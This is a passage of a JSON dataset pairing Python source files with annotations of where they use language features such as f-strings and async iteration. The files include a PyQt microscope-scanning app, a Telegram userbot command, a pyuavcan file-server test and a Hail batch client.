direction_x in [-1, 1]:\n            self.save_test_data(\"direction_x={0}\".format(direction_x))\n            dir_index_x = direction_x - int((direction_x - 1) / 2)\n            current_pos_index[0] = start_x_pos_index + dir_index_x\n            while (dir_index_x == 0 and current_pos_index[0] >= 0) \\\n                    or (dir_index_x == 1 and current_pos_index[0] <= len(coordinates_x_mm) - 1):\n                empty_column = True\n                for direction_y in [direction_y, -direction_y]:\n                    self.save_test_data(\"direction_y={0}\".format(direction_y))\n                    dir_index_y = direction_y - int((direction_y - 1) / 2)\n                    while (dir_index_y == 0 and current_pos_index[1] >= 0) \\\n                            or (dir_index_y == 1 and current_pos_index[1] <= len(coordinates_y_mm) - 1):\n                        if not img_file_matrix[current_pos_index[0]][current_pos_index[1]]:\n                            snap = self.coord_move([coordinates_x_mm[current_pos_index[0]],\n                                                    coordinates_y_mm[current_pos_index[1]],\n                                                    self.table_controller.coord_mm[2]],\n                                                   mode=\"discrete\", crop=True)\n                            file_name = os.path.join(self.dir_for_img, \"scan_{0}.jpg\".format(files_img_count))\n                            cv2.imwrite(file_name, snap)\n                            img_file_matrix[current_pos_index[0]][current_pos_index[1]] = file_name\n                            files_img_count += 1\n                            img_is_empty = self.img_is_empty(snap, delta)\n                            self.save_test_data(\"snap: x={0}, y={1}. empty={2}\"\n                                                .format(current_pos_index[0], current_pos_index[1], img_is_empty))\n                        else:\n                            img_is_empty = not img_obj_matrix[current_pos_index[0]][current_pos_index[1]]\n                            self.save_test_data(\"move: x={0}, y={1}. empty={2}\"\n                                                .format(current_pos_index[0], current_pos_index[1], img_is_empty))\n                        if img_is_empty:\n                            if snap_area_limits_y[dir_index_y] + direction_y == current_pos_index[1]:\n                                break\n                        else:\n                            if current_pos_index[1] * direction_y > snap_area_limits_y[dir_index_y] * direction_y:\n                                snap_area_limits_y[dir_index_y] = current_pos_index[1]\n                                self.save_test_data(\"limit Y[{0}]={1}\".format(dir_index_y, snap_area_limits_y[dir_index_y]))\n                            img_obj_matrix[current_pos_index[0]][current_pos_index[1]] = True\n                            empty_column = False\n                        current_pos_index[1] += direction_y\n                if empty_column:\n                    break\n                else:\n                    if current_pos_index[0] * direction_x > snap_area_limits_x[dir_index_x] * direction_x:\n                        snap_area_limits_x[dir_index_x] = current_pos_index[0]\n                        self.save_test_data(\"limit X[{0}]={1}\".format(dir_index_x, snap_area_limits_x[dir_index_x]))\n                current_pos_index[0] += direction_x\n        while True:\n            count_missed = 0\n            closest_cell = [0, 0]\n            closest_dist = 1000000\n            for i in range(snap_area_limits_x[0], snap_area_limits_x[1] + 1):\n                for j in range(snap_area_limits_y[0], snap_area_limits_y[1] + 1):\n                    if not img_file_matrix[i][j]:\n                        count_missed += 1\n                        dist = (abs(i - current_pos_index[0]) * self.frame_width_mm\n                                + abs(j - current_pos_index[1]) * self.frame_height_mm)\n                        if dist < closest_dist:\n                            closest_dist = dist\n                            closest_cell = [i, j]\n            if count_missed == 0:\n                break\n            else:\n                delta_x = 0\n                delta_y = 0\n                if closest_cell[1] > snap_area_limits_y[0] \\\n                        and not img_file_matrix[closest_cell[0]][closest_cell[1] - 1]:\n                    delta_y = -1\n                elif closest_cell[1] < snap_area_limits_y[1] \\\n                        and not img_file_matrix[closest_cell[0]][closest_cell[1] + 1]:\n                    delta_y = +1\n                elif closest_cell[0] > snap_area_limits_x[0] \\\n                        and not img_file_matrix[closest_cell[0] - 1][closest_cell[1]]:\n                    delta_x = -1\n                elif closest_cell[0] < snap_area_limits_x[1] \\\n                        and not img_file_matrix[closest_cell[0] + 1][closest_cell[1]]:\n                    delta_x = +1\n                while True:\n                    current_pos_index[0] = closest_cell[0]\n                    current_pos_index[1] = closest_cell[1]\n                    snap = self.coord_move([coordinates_x_mm[current_pos_index[0]],\n                                            coordinates_y_mm[current_pos_index[1]],\n                                            self.table_controller.coord_mm[2]],\n                                           mode=\"discrete\", crop=True)\n                    file_name = os.path.join(self.dir_for_img, \"scan_{0}.jpg\".format(files_img_count))\n                    cv2.imwrite(file_name, snap)\n                    img_file_matrix[current_pos_index[0]][current_pos_index[1]] = file_name\n                    files_img_count += 1\n                    img_is_empty = self.img_is_empty(snap, delta)\n                    self.save_test_data(\"snap+: x={0}, y={1}. empty={2}\"\n                                        .format(current_pos_index[0], current_pos_index[1], img_is_empty))\n                    closest_cell[0] += delta_x\n                    closest_cell[1] += delta_y\n                    if closest_cell[0] < snap_area_limits_x[0] or closest_cell[0] > snap_area_limits_x[1] \\\n                            or closest_cell[1] < snap_area_limits_y[0] or closest_cell[1] > snap_area_limits_y[1]:\n                        break\n                    if img_file_matrix[closest_cell[0]][closest_cell[1]]:\n                        break\n        for i in range(snap_area_limits_x[0], snap_area_limits_x[1] + 1):\n            for j in range(snap_area_limits_y[0], snap_area_limits_y[1] + 1):\n                j_r = snap_area_limits_y[1] - j\n                os.rename(img_file_matrix[i][j], os.path.join(self.dir_for_img,\n                                                              \"S_{0}_{1}.jpg\".format(j_r + 1,\n                                                                                     i - snap_area_limits_x[0] + 1)))\n        if not os.path.exists(self.dir_for_img):\n            os.mkdir(self.dir_for_img)\n        for file in os.listdir(self.dir_for_img):\n            if file.find('scan') == 0:\n                os.remove(os.path.join(self.dir_for_img, file))\n        root = Xml.Element(\"Root\")\n        elem_rc = Xml.Element(\"RowCount\")\n        elem_rc.text = str(snap_area_limits_y[1] - snap_area_limits_y[0] + 1)\n        root.append(elem_rc)\n        elem_cc = Xml.Element(\"ColCount\")\n        elem_cc.text = str(snap_area_limits_x[1] - snap_area_limits_x[0] + 1)\n        root.append(elem_cc)\n        elem_img = Xml.Element(\"Image\")\n        root.append(elem_img)\n        img_format = Xml.SubElement(elem_img, \"Format\")\n        img_format.text = \"jpg\"\n        img_size = Xml.SubElement(elem_img, \"ImgSize\")\n        img_size_width = Xml.SubElement(img_size, \"Width\")\n        img_size_width.text = str(self.program_settings.snap_settings.frame[2]\n                                  - self.program_settings.snap_settings.frame[0])\n        img_size_height = Xml.SubElement(img_size, \"Height\")\n        img_size_height.text = str(self.program_settings.snap_settings.frame[3]\n                                   - self.program_settings.snap_settings.frame[1])\n        img_con_area = Xml.SubElement(elem_img, \"ConnectionArea\")\n        ica_x = Xml.SubElement(img_con_area, \"X\")\n        ica_x.text = \"0\"\n        ica_y = Xml.SubElement(img_con_area, \"Y\")\n        ica_y.text = \"0\"\n        ica_width = Xml.SubElement(img_con_area, \"Width\")\n        ica_width.text = str(self.program_settings.snap_settings.frame[2]\n                             - self.program_settings.snap_settings.frame[0])\n        ica_height = Xml.SubElement(img_con_area, \"Height\")\n        ica_height.text = str(self.program_settings.snap_settings.frame[3]\n                              - self.program_settings.snap_settings.frame[1])\n        tree = Xml.ElementTree(root)\n        with open(self.path_for_xml_file, \"w\"):\n            tree.write(self.path_for_xml_file)\n        self.btn_save_scan.setEnabled(True)\n        self.unsaved = True\n        self.vidik.work = True\n        self.save_scan()\n    def save_scan(self):\n        if not os.path.exists(self.path_for_xml_file):\n            return False\n        file_filter = \"Microscope scans (*.misc)\"\n        a = QFileDialog.getSaveFileName(self, \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0441\u0442\u043e \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u0430\", \"/\",\n                                        \"All files (*.*);;Microscope scans (*.misc)\", file_filter)\n        file_name = a[0]\n        if len(file_name) > 0:\n            ext = os.path.splitext(file_name)\n            if ext[1] == \".misc\":\n                file_name = file_name\n            else:\n                file_name = ext[0] + \".misc\"\n            if os.path.exists(file_name):\n                dlg_result = QMessageBox.question(self, \"Confirm Dialog\",\n                                                  \"\u0424\u0430\u0439\u043b \u0443\u0436\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442. \" +\n                                                  \"\u0425\u043e\u0442\u0438\u0442\u0435 \u0435\u0433\u043e \u043f\u0435\u0440\u0435\u0437\u0430\u043f\u0438\u0441\u0430\u0442\u044c?\" +\n                                                  \" \u042d\u0442\u043e \u0443\u0434\u0430\u043b\u0438\u0442 \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u043d\u0435\u043c\",\n                                                  QMessageBox.Yes | QMessageBox.No, QMessageBox.No)\n                if dlg_result == QMessageBox.No:\n                    return False\n        else:\n            return False\n        self.vidik.work = False\n        z = zipfile.ZipFile(file_name, 'w')\n        for root, dirs, files in os.walk(self.dir_for_img):\n            for file in files:\n                if file:\n                    z.write(os.path.join(self.dir_for_img, file), file, compress_type=zipfile.ZIP_DEFLATED)\n        z.close()\n        QMessageBox.information(self, \"Info Dialog\", \"\u0424\u0430\u0439\u043b \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\", QMessageBox.Ok, QMessageBox.Ok)\n        self.unsaved = False\n        self.main_window.open_file(file_name)\n        self.vidik.work = True\n        return True\n    def eventFilter(self, obj, event):\n        if event.type() == QEvent.KeyPress:\n            if event.key() == Qt.Key_Shift:\n                self.key_shift_pressed = True\n            elif event.key() in self.keyboard_buttons:\n                self.keyboard_buttons[event.key()].key_press()\n        elif event.type() == QEvent.KeyRelease:\n            if event.key() in self.keyboard_buttons:\n                self.keyboard_buttons[event.key()].key_release()\n            elif event.key() == Qt.Key_Shift:\n                self.key_shift_pressed = False\n        return QMainWindow.eventFilter(self, obj, event)\n    def continuous_move(self):\n        steps_count = 24\n        if self.key_shift_pressed:\n            steps_count = 8\n        if self.keyboard_buttons[Qt.Key_W].check_click():\n            self.coord_move([0, steps_count, 0], mode=\"continuous\")\n        if self.keyboard_buttons[Qt.Key_D].check_click():\n            self.coord_move([steps_count, 0, 0], mode=\"continuous\")\n        if self.keyboard_buttons[Qt.Key_S].check_click():\n            self.coord_move([0, -steps_count, 0], mode=\"continuous\")\n        if self.keyboard_buttons[Qt.Key_A].check_click():\n            self.coord_move([-steps_count, 0, 0], mode=\"continuous\")\n        if self.keyboard_buttons[Qt.Key_Plus].check_click():\n            self.coord_move([0, 0, steps_count], mode=\"continuous\")\n        if self.keyboard_buttons[Qt.Key_Minus].check_click():\n            self.coord_move([0, 0, -steps_count], mode=\"continuous\")\n        time.sleep(0.01)\nclass Direction:\n    def __init__(self, index=0, direction=None):\n        self.__abs_index = index\n        if not direction:\n            self.__direction = [1, 0]\n        else:\n            self.__direction = direction\n    def __getitem__(self, key):\n        return self.__direction[key]\n    def __repr__(self):\n        return str(self.__abs_index) + str(self.__direction)\n    def __get_abs_index(self):\n        return self.__abs_index\n    abs_index = property(__get_abs_index)\n    def previous(self):\n        return Direction(self.__abs_index - 1, [self.__direction[1], -self.__direction[0]])\n    def next(self):\n        return Direction(self.__abs_index + 1, [-self.__direction[1], self.__direction[0]])\nclass KeyboardButton:\n    def __init__(self):\n        self.clicked = False\n        self.released = True\n        self.time_released = 0.0\n    def key_press(self):\n        self.clicked = True\n        self.released = False\n    def key_release(self):\n        self.released = True\n        self.time_released = time.time()\n    def check_click(self):\n        if self.clicked:\n            if self.released:\n                if time.time() - self.time_released > 0.02:\n                    self.clicked = False\n            else:\n                if time.time() - self.time_released > 1.00:\n                    self.clicked = False\n        return self.clicked\nclass TableServerThread(QThread):\n    def __init__(self, hostname, parent=None):\n        self.hostname = hostname\n        self.work = True\n        self.stopped = False\n        QThread.__init__(self, parent=parent)\n    def run(self) -> None:\n        shell = Terminal([\"ssh pi@\" + self.hostname, \"python3 server.py\", ])\n        shell.run()\n        while self.work:\n            time.sleep(1)\n        shell = None\n        self.stopped = True\nclass VideoStreamThread(QThread):\n    changePixmap = pyqtSignal(QPixmap)\n    def __init__(self, video_stream, video_img, parent=None):\n        self.video_stream = video_stream\n        self.video_img = video_img\n        self.work = True\n        QThread.__init__(self, parent=parent)\n    def run(self):\n        while True:\n            if self.work:\n                ret, self.video_img = self.video_stream.read()\n                if ret:\n                    self.changePixmap.emit(self.numpy_to_pixmap(self.video_img))\n                    time.sleep(0.02)\n            else:\n                time.sleep(0.1)\n    @staticmethod\n    def numpy_to_q_image(image):\n        q_img = QImage()\n        if image.dtype == np.uint8:\n            if len(image.shape) == 2:\n                channels = 1\n                height, width = image.shape\n                bytes_per_line = channels * width\n                q_img = QImage(\n                    image.data, width, height, bytes_per_line, QImage.Format_Indexed8\n                )\n                q_img.setColorTable([QtGui.qRgb(i, i, i) for i in range(256)])\n            elif len(image.shape) == 3:\n                if image.shape[2] == 3:\n                    height, width, channels = image.shape\n                    bytes_per_line = channels * width\n                    q_img = QImage(\n                        image.data, width, height, bytes_per_line, QImage.Format_BGR888\n                    )\n                elif image.shape[2] == 4:\n                    height, width, channels = image.shape\n                    bytes_per_line = channels * width\n                    q_img = QImage(\n                        image.data, width, height, bytes_per_line, QImage.Format_BGR888\n                    )\n        return q_img\n    @staticmethod\n    def numpy_to_pixmap(img):\n        q_img = VideoStreamThread.numpy_to_q_image(img)\n        pixmap = QPixmap.fromImage(q_img)\n        return pixmap\nclass TableController:\n    def __init__(self, loop, program_settings: ProgramSettings, vidik: VideoStreamThread, test=False,\n                 hostname=\"192.168.42.100\", port=8080):\n        self.program_settings = program_settings\n        self.vidik = vidik\n        self.hostname = hostname\n        self.port = port\n        self.server_status = 'uninitialized'\n        self.operation_status = ''\n        self.coord_step = [-1, -1, -1]\n        self.coord_mm = [-1.0, -1.0, -1.0]\n        self.manual_mode = True\n        self.manual_left_count = 0\n        self.manual_right_count = 0\n        self.loop = loop\n        self.execute = False\n        self.thread_server = TableServerThread(self.hostname)\n        self.test = test\n    def __repr__(self):\n        return \"coord = [{0:.2f}, {1:.2f}, {2:.2f}]; server status = {3}; last op status = {4}\".format(\n            self.coord_mm[0], self.coord_mm[1], self.coord_mm[2], self.server_status, self.operation_status\n        )\n    def __get_steps_in_mm(self):\n        return self.program_settings.table_settings.steps_in_mm\n    steps_in_mm = property(__get_steps_in_mm)\n    def __get_limits_step(self):\n        return self.program_settings.table_settings.limits_step\n    limits_step = property(__get_limits_step)\n    def __get_limits_mm(self):\n        return self.program_settings.table_settings.limits_mm\n    limits_mm = property(__get_limits_mm)\n    async def consumer(self):\n        url = f\"ws://{self.hostname}:{self.port}\"\n        async with websockets.connect(url) as web_socket:\n            await self.hello(web_socket)\n    @staticmethod\n    async def hello(web_socket) -> None:\n        async for message in web_socket:\n            print(message)\n    @staticmethod\n    async def produce(message: str, host: str, port: int) -> None:\n        async with websockets.connect(f\"ws://{host}:{port}\")as ws:\n            await ws.send(message)\n            result = await ws.recv()\n            return result\n    def get_request(self, x_step: int, y_step: int, z_step: int, mode: str):\n        self.execute = True\n        data = {\n            \"x\": -x_step,\n            \"y\": y_step,\n            \"z\": z_step,\n            \"mode\": mode  \n        }\n        data_string = json.dumps(data)\n        return data_string\n    def result_unpack(self, result):\n        result_str = json.loads(result)\n        self.coord_step = [self.limits_step[0] - result_str['x'], result_str['y'], result_str['z']]\n        self.coord_mm = [(self.coord_step[0] / self.steps_in_mm),\n                         (self.coord_step[1] / self.steps_in_mm),\n                         (self.coord_step[2] / self.steps_in_mm)]\n        self.operation_status = result_str['status']\n        self.server_status = result_str['status']\n        self.execute = False\n    def coord_init(self):\n        if not self.test:\n            data = self.get_request(x_step=0, y_step=0, z_step=0, mode=\"init\")\n            result = self.loop.run_until_complete(self.produce(message=data, host=self.hostname, port=self.port))\n            self.result_unpack(result)\n        else:\n            self.coord_step = [self.limits_step[0], 0, 0]\n            self.coord_mm = [self.limits_mm[0], 0, 0]\n            self.operation_status = 'init'\n            self.server_status = 'init'\n    def coord_check(self):\n        if not self.test:\n            data = self.get_request(x_step=0, y_step=0, z_step=0, mode=\"check\")\n            result = self.loop.run_until_complete(self.produce(message=data, host=self.hostname, port=self.port))\n            self.result_unpack(result)\n    def coord_move(self, coord, mode=\"discrete\"):\n        if not self.test:\n            if min(self.coord_step) < 0:\n                return\n            if mode == \"discrete\":\n                dx = coord[0] * self.steps_in_mm - self.coord_step[0]\n                dy = coord[1] * self.steps_in_mm - self.coord_step[1]\n                dz = coord[2] * self.steps_in_mm - self.coord_step[2]\n            else:\n                dx = coord[0]\n                dy = coord[1]\n                dz = coord[2]\n            data = self.get_request(x_step=int(dx), y_step=int(dy), z_step=int(dz), mode=mode)\n            result = self.loop.run_until_complete(self.produce(message=data, host=self.hostname, port=self.port))\n            self.result_unpack(result)\n        else:\n            if mode == \"discrete\":\n                self.coord_mm[0] = coord[0]\n                self.coord_mm[1] = coord[1]\n                self.coord_mm[2] = coord[2]\n                self.coord_step[0] = int(self.coord_mm[0] * self.steps_in_mm)\n                self.coord_step[1] = int(self.coord_mm[1] * self.steps_in_mm)\n                self.coord_step[2] = int(self.coord_mm[2] * self.steps_in_mm)\n            else:\n                coord[0] = -coord[0]\n                for i in range(3):\n                    self.coord_step[i] += coord[i]\n                    if self.coord_step[i] < 0:\n                        self.coord_step[i] = 0\n                    if self.coord_step[i] > self.limits_step[i]:\n                        self.coord_step[i] = self.limits_step[i]\n                    self.coord_mm[i] = self.coord_step[i] / self.steps_in_mm\n        self.operation_status = 'init'\n        self.server_status = 'init'\n    def server_check(self):\n        pass\n    def server_start(self):\n        shell = Terminal([\"ssh pi@\" + self.hostname, \"python3 server.py\", ])\n        shell.run()\n    def server_connect(self):\n        pass",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        1096,
                        1097,
                        "async for",
                        "async for message in web_socket:\n            print(message)"
                    ]
                ],
                "pep_498v": [
                    [
                        1078,
                        1080,
                        ".format()"
                    ],
                    [
                        320,
                        322,
                        ".format()"
                    ],
                    [
                        581,
                        581,
                        ".format()"
                    ],
                    [
                        744,
                        744,
                        ".format()"
                    ],
                    [
                        755,
                        755,
                        ".format()"
                    ],
                    [
                        604,
                        604,
                        ".format()"
                    ],
                    [
                        762,
                        762,
                        ".format()"
                    ],
                    [
                        836,
                        836,
                        ".format()"
                    ],
                    [
                        841,
                        842,
                        ".format()"
                    ],
                    [
                        854,
                        855,
                        ".format()"
                    ],
                    [
                        797,
                        797,
                        ".format()"
                    ],
                    [
                        771,
                        771,
                        ".format()"
                    ],
                    [
                        776,
                        777,
                        ".format()"
                    ],
                    [
                        780,
                        781,
                        ".format()"
                    ],
                    [
                        788,
                        788,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        1091,
                        "        url = f\"ws://{self.hostname}:{self.port}\""
                    ],
                    [
                        1100,
                        "        async with websockets.connect(f\"ws://{host}:{port}\")as ws:"
                    ]
                ]
            }
        },
        "57": {
            "file": "import asyncio\nfrom telethon import events\nfrom telethon.tl.types import ChannelParticipantsAdmins\nfrom uniborg.util import admin_cmd\n@borg.on(admin_cmd(\"alive\"))\nasync def _(event):\n    if event.fwd_from:\n        return\n    mentions = \"`Your bot is running\\n\\nTelethon version: 1.10.10\\nPython: 3.7.4\\nUser: @archernap\\nDatabase Status: Telegram Databases functioning normally!`\"\n    chat = await event.get_input_chat()\n    async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\"\n    reply_message = None\n    if event.reply_to_msg_id:\n        reply_message = await event.get_reply_message()\n        await reply_message.reply(mentions)\n    else:\n        await event.reply(mentions)\n    await event.delete()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        11,
                        12,
                        "async for",
                        "async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\""
                    ]
                ],
                "pep_498": [
                    [
                        12,
                        "        mentions += f\"\""
                    ]
                ]
            }
        },
        "58": {
            "file": "import sys\nimport shutil\nimport typing\nimport asyncio\nfrom tempfile import mkdtemp\nfrom pathlib import Path\nimport pytest\nimport pyuavcan\npytestmark = pytest.mark.asyncio\nasync def _unittest_file(compiled: typing.List[pyuavcan.dsdl.GeneratedPackageInfo]) -> None:\n    from pyuavcan.application import make_node, NodeInfo\n    from pyuavcan.transport.udp import UDPTransport\n    from pyuavcan.application.file import FileClient, FileServer, Error\n    assert compiled\n    asyncio.get_running_loop().slow_callback_duration = 3.0\n    root_a = mkdtemp(\".file\", \"a.\")\n    root_b = mkdtemp(\".file\", \"b.\")\n    srv_node = make_node(\n        NodeInfo(name=\"org.uavcan.pyuavcan.test.file.server\"),\n        transport=UDPTransport(\"127.63.0.0\", 222, service_transfer_multiplier=2),\n    )\n    cln_node = make_node(\n        NodeInfo(name=\"org.uavcan.pyuavcan.test.file.client\"),\n        transport=UDPTransport(\"127.63.0.0\", 223, service_transfer_multiplier=2),\n    )\n    try:\n        srv_node.start()\n        file_server = FileServer(srv_node, [root_a, root_b])\n        assert (Path(root_a), Path(\"abc\")) == file_server.locate(Path(\"abc\"))\n        assert [] == list(file_server.glob(\"*\"))\n        cln_node.start()\n        cln = FileClient(cln_node, 222)\n        async def ls(path: str) -> typing.List[str]:\n            out: typing.List[str] = []\n            async for e in cln.list(path):\n                out.append(e)\n            return out\n        assert [] == await ls(\"\")\n        assert [] == await ls(\"nonexistent/directory\")\n        assert (await cln.get_info(\"none\")).error.value == Error.NOT_FOUND\n        assert 0 == await cln.touch(\"a/foo/x\")\n        assert 0 == await cln.touch(\"a/foo/y\")\n        assert 0 == await cln.touch(\"b\")\n        assert [\"foo\"] == await ls(\"a\")\n        assert [\n            (file_server.roots[0], Path(\"a/foo/x\")),\n            (file_server.roots[0], Path(\"a/foo/y\")),\n        ] == list(sorted(file_server.glob(\"a/foo/*\")))\n        assert await cln.read(\"a/foo/x\") == b\"\"\n        assert await cln.read(\"/a/foo/x\") == b\"\"  \n        assert await cln.read(\"a/foo/z\") == Error.NOT_FOUND\n        assert (await cln.get_info(\"a/foo/z\")).error.value == Error.NOT_FOUND\n        assert await cln.write(\"a/foo/z\", bytes(range(200)) * 3) == Error.NOT_FOUND\n        assert await cln.write(\"a/foo/x\", bytes(range(200)) * 3) == 0\n        assert await cln.read(\"a/foo/x\") == bytes(range(200)) * 3\n        assert (await cln.get_info(\"a/foo/x\")).size == 600\n        hundred = bytes(x ^ 0xFF for x in range(100))\n        assert await cln.write(\"a/foo/x\", hundred * 4) == 0\n        assert (await cln.get_info(\"a/foo/x\")).size == 400\n        assert await cln.read(\"a/foo/x\") == (hundred * 4)\n        assert (await cln.get_info(\"a/foo/x\")).size == 400\n        ref = bytearray(hundred * 4)\n        for i in range(100):\n            ref[i + 100] = 0x55\n        assert len(ref) == 400\n        assert (await cln.get_info(\"a/foo/x\")).size == 400\n        assert await cln.write(\"a/foo/x\", b\"\\x55\" * 100, offset=100, truncate=False) == 0\n        assert (await cln.get_info(\"a/foo/x\")).size == 400\n        assert await cln.read(\"a/foo/x\") == ref\n        assert await cln.write(\"a/foo/x\", b\"\\xAA\" * 50, offset=50) == 0\n        assert (await cln.get_info(\"a/foo/x\")).size == 100\n        assert await cln.read(\"a/foo/x\") == hundred[:50] + b\"\\xAA\" * 50\n        info = await cln.get_info(\"a/foo\")\n        print(\"a/foo:\", info)\n        assert info.error.value == 0\n        assert info.is_writeable\n        assert info.is_readable\n        assert not info.is_file_not_directory\n        assert not info.is_link\n        assert (await cln.get_info(\"a/foo/nothing\")).error.value == Error.NOT_FOUND\n        assert await cln.write(\"a/foo\", b\"123\") in (Error.IS_DIRECTORY, Error.ACCESS_DENIED)  \n        assert (await cln.remove(\"a/foo/z\")) == Error.NOT_FOUND\n        assert (await cln.remove(\"a/foo/x\")) == 0\n        assert (await cln.touch(\"a/foo/x\")) == 0  \n        assert (await cln.remove(\"a/foo/\")) == 0  \n        assert (await cln.remove(\"a/foo/\")) == Error.NOT_FOUND  \n        assert (await cln.touch(\"r/a\")) == 0\n        assert (await cln.touch(\"r/b/0\")) == 0\n        assert (await cln.touch(\"r/b/1\")) == 0\n        assert not (await cln.get_info(\"r/b\")).is_file_not_directory\n        assert [\"a\", \"b\"] == await ls(\"r\")\n        assert (await cln.copy(\"r/b\", \"r/c\")) == 0\n        assert [\"a\", \"b\", \"c\"] == await ls(\"r\")\n        assert (await cln.copy(\"r/a\", \"r/c\")) != 0  \n        assert [\"a\", \"b\", \"c\"] == await ls(\"r\")\n        assert not (await cln.get_info(\"r/c\")).is_file_not_directory\n        assert (await cln.copy(\"/r/a\", \"r/c\", overwrite=True)) == 0\n        assert (await cln.get_info(\"r/c\")).is_file_not_directory\n        assert [\"a\", \"b\", \"c\"] == await ls(\"r\")\n        assert (await cln.move(\"/r/a\", \"r/c\")) != 0  \n        assert (await cln.move(\"/r/a\", \"r/c\", overwrite=True)) == 0\n        assert [\"b\", \"c\"] == await ls(\"r\")\n        assert (await cln.move(\"/r/a\", \"r/c\", overwrite=True)) == Error.NOT_FOUND\n        assert [\"b\", \"c\"] == await ls(\"r\")\n        if sys.platform.startswith(\"linux\"):  \n            file_server.roots.append(Path(\"/\"))\n            info = await cln.get_info(\"dev/null\")\n            print(\"/dev/null:\", info)\n            assert info.error.value == 0\n            assert not info.is_link\n            assert info.is_writeable\n            assert info.is_file_not_directory\n            info = await cln.get_info(\"/bin/sh\")\n            print(\"/bin/sh:\", info)\n            assert info.error.value == 0\n            assert not info.is_writeable\n            assert info.is_file_not_directory\n            assert await cln.read(\"/dev/null\", size=100) == b\"\"  \n            assert await cln.read(\"/dev/zero\", size=100) == b\"\\x00\" * 256  \n            assert await cln.write(\"bin/sh\", b\"123\") == Error.ACCESS_DENIED\n            file_server.roots.pop(-1)\n    finally:\n        srv_node.close()\n        cln_node.close()\n        await asyncio.sleep(1.0)\n        shutil.rmtree(root_a, ignore_errors=True)\n        shutil.rmtree(root_b, ignore_errors=True)",
            "patterns": {
                "pep_526": [
                    [
                        34,
                        "out: typing.List[str] = []"
                    ]
                ],
                "pep_567": [
                    [
                        4,
                        4,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        35,
                        36,
                        "async for",
                        "async for e in cln.list(path):\n                out.append(e)"
                    ]
                ]
            }
        },
        "59": {
            "file": "from typing import Optional, Dict, Any\nimport math\nimport random\nimport logging\nimport json\nimport functools\nimport asyncio\nimport aiohttp\nimport secrets\nfrom hailtop.config import get_deploy_config, DeployConfig\nfrom hailtop.auth import service_auth_headers\nfrom hailtop.utils import bounded_gather, request_retry_transient_errors, tqdm, TQDM_DEFAULT_DISABLE\nfrom hailtop.httpx import client_session\nfrom .globals import tasks, complete_states\nlog = logging.getLogger('batch_client.aioclient')\nclass Job:\n    @staticmethod\n    def _get_error(job_status, task):\n        status = job_status.get('status')\n        if not status:\n            return None\n        container_statuses = status.get('container_statuses')\n        if not container_statuses:\n            return None\n        container_status = container_statuses.get(task)\n        if not container_status:\n            return None\n        error = container_status.get('error')\n        if error:\n            return error\n        docker_container_status = container_status.get('container_status')\n        if not docker_container_status:\n            return None\n        return docker_container_status.get('error')\n    @staticmethod\n    def _get_out_of_memory(job_status, task):\n        status = job_status.get('status')\n        if not status:\n            return None\n        container_statuses = status.get('container_statuses')\n        if not container_statuses:\n            return None\n        container_status = container_statuses.get(task)\n        if not container_status:\n            return None\n        docker_container_status = container_status.get('container_status')\n        if not docker_container_status:\n            return None\n        return docker_container_status['out_of_memory']\n    @staticmethod\n    def _get_container_status_exit_code(container_status):\n        error = container_status.get('error')\n        if error is not None:\n            return None\n        docker_container_status = container_status.get('container_status')\n        if not docker_container_status:\n            return None\n        return docker_container_status.get('exit_code')\n    @staticmethod\n    def _get_exit_code(job_status, task):\n        status = job_status.get('status')\n        if not status:\n            return None\n        container_statuses = status.get('container_statuses')\n        if not container_statuses:\n            return None\n        container_status = container_statuses.get(task)\n        if not container_status:\n            return None\n        return Job._get_container_status_exit_code(container_status)\n    @staticmethod\n    def _get_exit_codes(job_status):\n        status = job_status.get('status')\n        if not status:\n            return None\n        error = status.get('error')\n        if error is not None:\n            return None\n        container_statuses = status.get('container_statuses')\n        if not container_statuses:\n            return None\n        return {\n            task: Job._get_container_status_exit_code(container_status)\n            for task, container_status in container_statuses.items()\n        }\n    @staticmethod\n    def exit_code(job_status):\n        exit_codes = Job._get_exit_codes(job_status)\n        if exit_codes is None:\n            return None\n        exit_codes = [\n            exit_codes[task]\n            for task in tasks\n            if task in exit_codes\n        ]\n        i = 0\n        while i < len(exit_codes):\n            ec = exit_codes[i]\n            if ec is None:\n                return None\n            if ec > 0:\n                return ec\n            i += 1\n        return 0\n    @staticmethod\n    def total_duration_msecs(job_status):\n        status = job_status.get('status')\n        if not status:\n            return None\n        container_statuses = status.get('container_statuses')\n        if not container_statuses:\n            return None\n        def _get_duration(container_status):\n            if not container_status:\n                return None\n            timing = container_status.get('timing')\n            if not timing:\n                return None\n            runtime = timing.get('runtime')\n            if not runtime:\n                return None\n            return runtime.get('duration')\n        durations = [\n            _get_duration(container_status)\n            for task, container_status in container_statuses.items()\n        ]\n        if any(d is None for d in durations):\n            return None\n        return sum(durations)\n    @staticmethod\n    def unsubmitted_job(batch_builder, job_id):\n        assert isinstance(batch_builder, BatchBuilder)\n        _job = UnsubmittedJob(batch_builder, job_id)\n        return Job(_job)\n    @staticmethod\n    def submitted_job(batch, job_id, _status=None):\n        assert isinstance(batch, Batch)\n        _job = SubmittedJob(batch, job_id, _status)\n        return Job(_job)\n    def __init__(self, job):\n        self._job = job\n    @property\n    def batch_id(self):\n        return self._job.batch_id\n    @property\n    def job_id(self):\n        return self._job.job_id\n    @property\n    def id(self):\n        return self._job.id\n    async def attributes(self):\n        return await self._job.attributes()\n    async def is_complete(self):\n        return await self._job.is_complete()\n    async def status(self):\n        return await self._job.status()\n    @property\n    def _status(self):\n        return self._job._status\n    async def wait(self):\n        return await self._job.wait()\n    async def log(self):\n        return await self._job.log()\n    async def attempts(self):\n        return await self._job.attempts()\nclass UnsubmittedJob:\n    def _submit(self, batch):\n        return SubmittedJob(batch, 